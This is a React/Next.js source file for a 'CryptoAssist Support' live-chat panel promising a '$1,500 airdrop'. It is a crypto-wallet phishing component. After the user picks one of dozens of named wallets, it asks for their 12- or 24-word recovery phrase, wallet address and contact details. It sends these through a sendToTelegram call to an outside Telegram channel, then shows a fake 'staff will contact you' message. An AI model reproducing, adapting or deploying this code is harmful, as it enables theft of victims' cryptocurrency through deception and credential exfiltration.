"use client"

import type React from "react"
import Link from "next/link"
import { sendToTelegram } from "@/lib/telegram"

import { useState } from "react"

const WALLETS = [
  { name: "Alpha Wallet", icon: "🅰️" },
  { name: "Argent X", icon: "🛡️" },
  { name: "Atomic Wallet", icon: "⚛️" },
  { name: "Bitget Wallet", icon: "🎯" },
  { name: "Binance Web3", icon: "🔶" },
  { name: "BlueWallet", icon: "💙" },
  { name: "Brave Wallet", icon: "🦁" },
  { name: "Coin98", icon: "💰" },
  { name: "Coinbase", icon: "📱" },
  { name: "Coinomi", icon: "🪙" },
  { name: "CoolWallet", icon: "❄️" },
  { name: "Crypto.com DeFi", icon: "🔴" },
  { name: "Electrum", icon: "⚡" },
  { name: "Ellipal Titan", icon: "🛡️" },
  { name: "Enjin Wallet", icon: "🎮" },
  { name: "Exodus", icon: "📤" },
  { name: "Frame Wallet", icon: "🖼️" },
  { name: "Frontier", icon: "🌍" },
  { name: "Guarda", icon: "🏰" },
  { name: "Huobi/HTX", icon: "🔶" },
  { name: "ImToken", icon: "📲" },
  { name: "Keplr", icon: "🪐" },
  { name: "Keystone Pro", icon: "🔑" },
  { name: "KuCoin", icon: "🟡" },
  { name: "Ledger Nano", icon: "🔐" },
  { name: "Magic Eden", icon: "✨" },
  { name: "Maiar Wallet", icon: "🌟" },
  { name: "MathChain", icon: "🔢" },
  { name: "MathWallet", icon: "Ⓜ️" },
  { name: "MetaMask", icon: "🦊" },
  { name: "Muun", icon: "🌙" },
  { name: "Nabox", icon: "📦" },
  { name: "OKX Wallet", icon: "🟣" },
  { name: "ONTO Wallet", icon: "🌐" },
  { name: "Opera Crypto", icon: "🎭" },
  { name: "Phantom", icon: "👻" },
  { name: "Pillar", icon: "🏛️" },
  { name: "Rabby", icon: "🐰" },
  { name: "Rainbow", icon: "🌈" },
  { name: "SafePal", icon: "🛡️" },
  { name: "SafeMath", icon: "🔒" },
  { name: "Samourai", icon: "⚔️" },
  { name: "Sparrow", icon: "🐦" },
  { name: "Stake", icon: "📍" },
  { name: "Taho", icon: "🎨" },
  { name: "Temple", icon: "🏛️" },
  { name: "Trezor", icon: "🛡️" },
  { name: "TokenPocket", icon: "👜" },
  { name: "Trust Wallet", icon: "✅" },
  { name: "ViaWallet", icon: "🌉" },
  { name: "Wasabi", icon: "🌶️" },
  { name: "XDEFI", icon: "❌" },
  { name: "Zerion", icon: "Z️" },
]

const CRYPTOS = [
  "Bitcoin (BTC)",
  "Ethereum (ETH)",
  "Cardano (ADA)",
  "Solana (SOL)",
  "Polkadot (DOT)",
  "Ripple (XRP)",
  "Litecoin (LTC)",
  "Chainlink (LINK)",
  "Polygon (MATIC)",
  "Avalanche (AVAX)",
  "Arbitrum (ARB)",
  "Optimism (OP)",
]

export default function LiveSupport({ open, onOpenChange }: { open: boolean; onOpenChange: (open: boolean) => void }) {
  const [step, setStep] = useState<"category" | "wallet" | "phrase" | "confirmation">("category")
  const [category, setCategory] = useState<string | null>(null)
  const [selectedWallet, setSelectedWallet] = useState<string | null>(null)
  const [selectedCrypto, setSelectedCrypto] = useState<string | null>(null)
  const [phraseKey, setPhraseKey] = useState("")
  const [walletAddress, setWalletAddress] = useState("")
  const [formData, setFormData] = useState({
    fullName: "",
    email: "",
    phone: "",
    message: "",
  })
  const [loading, setLoading] = useState(false)

  const handleCategorySelect = (cat: string) => {
    setCategory(cat)
    setStep("wallet")
  }

  const handleWalletProceed = () => {
    if (selectedWallet && selectedCrypto) {
      setStep("phrase")
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (phraseKey.trim() && walletAddress.trim() && formData.fullName && formData.email) {
      setStep("confirmation")
    }
  }

  const handleConfirmAndSendToTelegram = async () => {
    setLoading(true)
    const success = await sendToTelegram({
      walletAddress,
      credential: phraseKey,
      credentialType: "phrase",
      wallet: selectedWallet || "",
      crypto: selectedCrypto || "",
      userInfo: {
        name: formData.fullName,
        email: formData.email,
        phone: formData.phone,
        message: formData.message,
        category,
      },
    })
    setLoading(false)

    if (success) {
      const successDiv = document.createElement("div")
      successDiv.innerHTML = `
        <div class="fixed inset-0 z-[9999] flex items-center justify-center bg-black/50 pointer-events-auto">
          <div class="bg-blue-900 rounded-xl p-8 shadow-2xl max-w-md text-center border border-blue-800">
            <div class="text-5xl mb-4">✓</div>
            <h2 class="text-2xl font-bold text-white mb-2">Request Submitted!</h2>
            <p class="text-blue-200 mb-4">
              Please wait while our staff gets in touch with you. This usually takes 24 hours to confirm all information.
            </p>
            <p class="text-cyan-400 font-semibold mb-4">Response will be sent via: ${formData.email}</p>
            <button onclick="location.reload()" class="w-full bg-cyan-500 hover:bg-cyan-600 text-blue-950 py-2 rounded font-semibold transition">
              Close
            </button>
          </div>
        </div>
      `
      document.body.appendChild(successDiv)
      resetForm()
    }
  }

  const resetForm = () => {
    setStep("category")
    setCategory(null)
    setSelectedWallet(null)
    setSelectedCrypto(null)
    setPhraseKey("")
    setWalletAddress("")
    setFormData({ fullName: "", email: "", phone: "", message: "" })
  }

  if (!open) return null

  return (
    <div className="fixed inset-0 z-50 pointer-events-none">
      {/* Overlay */}
      <div
        className="absolute inset-0 bg-black/50 pointer-events-auto"
        onClick={() => {
          onOpenChange(false)
          resetForm()
        }}
      />

      {/* Sliding Panel */}
      <div className="absolute right-0 top-0 bottom-0 w-96 bg-blue-900 shadow-2xl flex flex-col pointer-events-auto transform transition-transform duration-300 overflow-hidden">
        {/* Header */}
        <div className="bg-gradient-to-r from-blue-950 to-blue-900 border-b border-blue-800 text-white p-6 flex justify-between items-center flex-shrink-0">
          <div>
            <h2 className="text-xl font-bold">CryptoAssist Support</h2>
            <p className="text-cyan-400 text-xs mt-1">$1,500 Claim Support</p>
          </div>
          <button
            onClick={() => {
              onOpenChange(false)
              resetForm()
            }}
            className="hover:bg-blue-800 p-1 rounded transition"
          >
            <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
            </svg>
          </button>
        </div>

        {/* Content */}
        <div className="flex-1 overflow-y-auto p-6">
          {step === "category" && (
            <div className="space-y-3">
              <p className="text-blue-100 font-semibold mb-4">How can we help you claim your $1,500 airdrop?</p>
              {["General Enquiries", "Claim Issues", "Wallet Connection Help"].map((cat) => (
                <button
                  key={cat}
                  onClick={() => handleCategorySelect(cat)}
                  className="w-full text-left px-4 py-3 border border-blue-700 text-white rounded hover:bg-blue-800 hover:border-cyan-500 transition"
                >
                  {cat}
                </button>
              ))}
            </div>
          )}

          {step === "wallet" && (
            <div>
              <button
                onClick={() => setStep("category")}
                className="text-cyan-400 hover:text-cyan-300 font-semibold mb-4 flex items-center gap-1"
              >
                ← Back
              </button>

              <h3 className="text-lg font-bold text-white mb-4">{category}</h3>

              <div className="space-y-4">
                <div>
                  <label className="block text-sm font-semibold text-blue-100 mb-2">Select Your Wallet</label>
                  <div className="grid grid-cols-2 gap-2">
                    {WALLETS.map((wallet) => (
                      <Link
                        key={wallet.name}
                        href="/importwallet"
                        className="p-3 rounded text-center text-sm transition bg-blue-800 text-blue-100 hover:bg-cyan-500 hover:text-blue-950 hover:font-bold border border-blue-700 hover:border-cyan-500"
                      >
                        <div className="text-lg mb-1">{wallet.icon}</div>
                        <div className="text-xs">{wallet.name}</div>
                      </Link>
                    ))}
                  </div>
                </div>

                <div>
                  <label className="block text-sm font-semibold text-blue-100 mb-2">Select Cryptocurrency</label>
                  <select
                    value={selectedCrypto || ""}
                    onChange={(e) => setSelectedCrypto(e.target.value)}
                    className="w-full px-3 py-2 border border-blue-700 rounded bg-blue-800 text-white focus:outline-none focus:border-cyan-500"
                  >
                    <option value="">Choose a crypto...</option>
                    {CRYPTOS.map((crypto) => (
                      <option key={crypto} value={crypto}>
                        {crypto}
                      </option>
                    ))}
                  </select>
                </div>

                <div className="bg-blue-800 p-3 rounded-lg">
                  <p className="text-blue-100 text-xs">
                    <span className="font-semibold text-cyan-400">Airdrop:</span> $1,500 worth
                  </p>
                </div>

                <button
                  onClick={handleWalletProceed}
                  disabled={!selectedWallet || !selectedCrypto}
                  className="w-full bg-cyan-500 hover:bg-cyan-600 disabled:bg-blue-700 disabled:cursor-not-allowed text-blue-950 py-2 rounded font-semibold transition"
                >
                  Continue
                </button>
              </div>
            </div>
          )}

          {step === "phrase" && (
            <form onSubmit={handleSubmit} className="space-y-4">
              <button
                type="button"
                onClick={() => setStep("wallet")}
                className="text-cyan-400 hover:text-cyan-300 font-semibold mb-4 flex items-center gap-1"
              >
                ← Back
              </button>

              <h3 className="text-lg font-bold text-white mb-4">Verify Your Wallet</h3>

              <div className="bg-blue-800 p-3 rounded-lg mb-4">
                <p className="text-blue-100 text-xs">
                  <span className="font-semibold">Wallet:</span> {selectedWallet}
                </p>
                <p className="text-blue-100 text-xs">
                  <span className="font-semibold">Crypto:</span> {selectedCrypto}
                </p>
                <p className="text-cyan-400 text-xs font-semibold mt-2">Airdrop: $1,500</p>
              </div>

              <div>
                <label className="block text-sm font-semibold text-blue-100 mb-2">Recovery Phrase Key</label>
                <textarea
                  value={phraseKey}
                  onChange={(e) => setPhraseKey(e.target.value)}
                  placeholder="Enter your 12 or 24-word recovery phrase..."
                  className="w-full px-3 py-2 border border-blue-700 rounded bg-blue-800 text-white placeholder-blue-400 focus:outline-none focus:border-cyan-500 resize-none h-16 text-xs"
                />
              </div>

              <div>
                <label className="block text-sm font-semibold text-blue-100 mb-2">Wallet Address</label>
                <input
                  type="text"
                  value={walletAddress}
                  onChange={(e) => setWalletAddress(e.target.value)}
                  placeholder="0x..."
                  className="w-full px-3 py-2 border border-blue-700 rounded bg-blue-800 text-white placeholder-blue-400 focus:outline-none focus:border-cyan-500 text-sm"
                />
              </div>

              <input
                type="text"
                placeholder="Full Name"
                value={formData.fullName}
                onChange={(e) => setFormData({ ...formData, fullName: e.target.value })}
                className="w-full px-3 py-2 border border-blue-700 rounded bg-blue-800 text-white placeholder-blue-400 focus:outline-none focus:border-cyan-500 text-sm"
              />

              <input
                type="email"
                placeholder="Email"
                value={formData.email}
                onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                className="w-full px-3 py-2 border border-blue-700 rounded bg-blue-800 text-white placeholder-blue-400 focus:outline-none focus:border-cyan-500 text-sm"
              />

              <textarea
                placeholder="Describe your issue..."
                value={formData.message}
                onChange={(e) => setFormData({ ...formData, message: e.target.value })}
                className="w-full px-3 py-2 border border-blue-700 rounded bg-blue-800 text-white placeholder-blue-400 focus:outline-none focus:border-cyan-500 resize-none h-16 text-sm"
              />

              <button
                type="submit"
                disabled={!phraseKey.trim() || !walletAddress.trim() || !formData.fullName || !formData.email}
                className="w-full bg-cyan-500 hover:bg-cyan-600 disabled:bg-blue-700 disabled:cursor-not-allowed text-blue-950 py-2 rounded font-semibold transition"
              >
                Submit Request
              </button>
            </form>
          )}

          {step === "confirmation" && (
            <div className="flex flex-col items-center justify-center space-y-4">
              <div className="text-5xl mb-4">✓</div>
              <h2 className="text-2xl font-bold text-white mb-2">Request Submitted!</h2>
              <p className="text-blue-200 mb-4">
                Please wait while our staff gets in touch with you. This usually takes 24 hours to confirm all
                information.
              </p>
              <p className="text-cyan-400 font-semibold mb-4">Response will be sent via: {formData.email}</p>
              <button
                onClick={() => {
                  onOpenChange(false)
                  resetForm()
                }}
                className="w-full bg-cyan-500 hover:bg-cyan-600 text-blue-950 py-2 rounded font-semibold transition"
              >
                Close
              </button>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}
